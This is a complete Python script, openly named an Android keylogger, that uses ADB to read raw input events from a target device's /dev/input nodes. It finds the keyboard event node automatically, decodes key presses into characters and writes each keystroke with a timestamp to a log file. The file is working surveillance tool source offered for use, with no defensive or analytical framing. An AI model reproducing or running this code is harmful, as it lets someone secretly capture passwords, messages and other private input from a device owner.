#!/usr/bin/env python3
"""
Android Keylogger — ADB-based input event monitor
Reads /dev/input/eventX on the target device via ADB shell,
decodes EV_KEY events and logs them to a file.

Requirements:
  - adb in PATH
  - USB debugging enabled on target device (or ADB over TCP)
  - Root or sufficient permissions on device to read /dev/input/*

Usage:
  python keylogger.py [--serial <device_serial>] [--event <eventN>] [--out <logfile>]
"""

import subprocess
import struct
import sys
import time
import argparse
import os
from datetime import datetime

# ──────────────────────────────────────────────
# Linux input_event struct:
#   struct input_event {
#       struct timeval time;   // 8 or 16 bytes depending on arch
#       __u16 type;
#       __u16 code;
#       __s32 value;
#   };
# On 64-bit Android: timeval = 16 bytes → total = 24 bytes
# On 32-bit Android: timeval =  8 bytes → total = 16 bytes
# ──────────────────────────────────────────────

INPUT_EVENT_SIZE_64 = 24
INPUT_EVENT_SIZE_32 = 16

EV_KEY   = 0x01
KEY_DOWN = 1
KEY_HOLD = 2

# Minimal keycode → char map (Android uses Linux keycodes)
KEYCODE_MAP = {
    2: '1', 3: '2', 4: '3', 5: '4', 6: '5',
    7: '6', 8: '7', 9: '8', 10: '9', 11: '0',
    12: '-', 13: '=', 14: '[BACKSPACE]',
    15: '[TAB]',
    16: 'q', 17: 'w', 18: 'e', 19: 'r', 20: 't',
    21: 'y', 22: 'u', 23: 'i', 24: 'o', 25: 'p',
    26: '[', 27: ']', 28: '[ENTER]',
    30: 'a', 31: 's', 32: 'd', 33: 'f', 34: 'g',
    35: 'h', 36: 'j', 37: 'k', 38: 'l',
    39: ';', 40: "'", 41: '`',
    43: '\\',
    44: 'z', 45: 'x', 46: 'c', 47: 'v', 48: 'b',
    49: 'n', 50: 'm',
    51: ',', 52: '.', 53: '/',
    57: '[SPACE]',
    58: '[CAPS]',
    59: '[F1]', 60: '[F2]', 61: '[F3]', 62: '[F4]',
    63: '[F5]', 64: '[F6]', 65: '[F7]', 66: '[F8]',
    67: '[F9]', 68: '[F10]',
    87: '[F11]', 88: '[F12]',
    103: '[UP]', 105: '[LEFT]', 106: '[RIGHT]', 108: '[DOWN]',
    111: '[ESC]',
    113: '[MUTE]', 114: '[VOL-]', 115: '[VOL+]',
    116: '[POWER]',
    139: '[MENU]',
    158: '[BACK]',
    172: '[HOME]',
    212: '[CAMERA]',
    217: '[SEARCH]',
}


def adb(serial: str, *args) -> list[str]:
    """Build adb command with optional serial."""
    cmd = ['adb']
    if serial:
        cmd += ['-s', serial]
    cmd += list(args)
    return cmd


def detect_event_node(serial: str) -> str:
    """
    Find the first event node that reports EV_KEY (keyboard/input).
    Parses /proc/bus/input/devices on the device.
    """
    result = subprocess.run(
        adb(serial, 'shell', 'cat /proc/bus/input/devices'),
        capture_output=True, text=True
    )
    lines = result.stdout.splitlines()
    current_handlers = []
    current_ev = ''
    for line in lines:
        line = line.strip()
        if line.startswith('H: Handlers='):
            current_handlers = line.split('=', 1)[1].split()
        elif line.startswith('B: EV='):
            current_ev = line.split('=', 1)[1].strip()
        elif line == '':
            # EV bitmask: bit 1 = EV_KEY
            try:
                ev_bits = int(current_ev, 16)
                if ev_bits & (1 << EV_KEY):
                    for h in current_handlers:
                        if h.startswith('event'):
                            return f'/dev/input/{h}'
            except ValueError:
                pass
            current_handlers = []
            current_ev = ''
    return '/dev/input/event0'  # fallback


def detect_arch(serial: str) -> int:
    """Return event struct size based on device arch."""
    result = subprocess.run(
        adb(serial, 'shell', 'uname -m'),
        capture_output=True, text=True
    )
    arch = result.stdout.strip()
    # aarch64 / x86_64 → 64-bit timeval (16 bytes)
    if '64' in arch:
        return INPUT_EVENT_SIZE_64
    return INPUT_EVENT_SIZE_32


def parse_event(data: bytes, event_size: int):
    """
    Parse a single input_event from raw bytes.
    Returns (type, code, value) or None on bad data.
    """
    if len(data) < event_size:
        return None
    if event_size == INPUT_EVENT_SIZE_64:
        # timeval: 2x int64, then type(u16), code(u16), value(s32)
        fmt = '<qqHHi'
    else:
        # timeval: 2x int32, then type(u16), code(u16), value(s32)
        fmt = '<iiHHi'
    unpacked = struct.unpack_from(fmt, data)
    ev_type  = unpacked[2]
    ev_code  = unpacked[3]
    ev_value = unpacked[4]
    return ev_type, ev_code, ev_value


def run(serial: str, event_node: str, outfile: str):
    event_size = detect_arch(serial)
    print(f'[*] Device arch event size: {event_size} bytes')
    print(f'[*] Monitoring: {event_node}')
    print(f'[*] Logging to: {outfile}')
    print(f'[*] Press Ctrl+C to stop.\n')

    # Stream raw bytes from the event node via adb shell
    proc = subprocess.Popen(
        adb(serial, 'shell', f'cat {event_node}'),
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )

    buf = b''
    with open(outfile, 'a', encoding='utf-8') as log:
        log.write(f'=== Session start: {datetime.now().isoformat()} ===\n')
        try:
            while True:
                chunk = proc.stdout.read(event_size * 8)
                if not chunk:
                    break
                buf += chunk
                while len(buf) >= event_size:
                    event_data = buf[:event_size]
                    buf = buf[event_size:]
                    parsed = parse_event(event_data, event_size)
                    if parsed is None:
                        continue
                    ev_type, ev_code, ev_value = parsed
                    if ev_type == EV_KEY and ev_value in (KEY_DOWN, KEY_HOLD):
                        char = KEYCODE_MAP.get(ev_code, f'[KEY_{ev_code}]')
                        ts   = datetime.now().strftime('%H:%M:%S.%f')[:-3]
                        entry = f'[{ts}] {char}'
                        print(entry)
                        log.write(entry + '\n')
                        log.flush()
        except KeyboardInterrupt:
            print('\n[*] Stopped.')
            log.write(f'=== Session end: {datetime.now().isoformat()} ===\n')
        finally:
            proc.terminate()


def main():
    parser = argparse.ArgumentParser(description='Android ADB keylogger')
    parser.add_argument('--serial', default='',      help='ADB device serial (optional)')
    parser.add_argument('--event',  default='',      help='Event node, e.g. event1 (auto-detect if omitted)')
    parser.add_argument('--out',    default='keylog.txt', help='Output log file')
    args = parser.parse_args()

    # Verify adb is reachable
    check = subprocess.run(['adb', 'devices'], capture_output=True, text=True)
    if 'List of devices' not in check.stdout:
        print('[-] adb not found or not in PATH.')
        sys.exit(1)

    event_node = f'/dev/input/{args.event}' if args.event else detect_event_node(args.serial)
    run(args.serial, event_node, args.out)


if __name__ == '__main__':
    main()
